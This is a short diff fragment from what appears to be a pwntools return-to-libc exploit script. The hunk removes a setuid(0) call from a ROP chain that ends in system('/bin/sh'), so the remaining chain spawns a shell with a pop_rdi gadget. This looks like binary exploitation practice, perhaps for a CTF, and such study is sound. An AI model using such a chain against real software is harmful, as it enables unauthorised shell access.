@@ -162,10 +162,6 @@ payload = flat(
 	
 	# read 
 	pop_rdi,
-	0,
-	libc_base + libc.sym['setuid'],
-	ret,
-	pop_rdi,
 	bin_sh_addr,
 	ret,
 	libc_base + libc.sym['system']
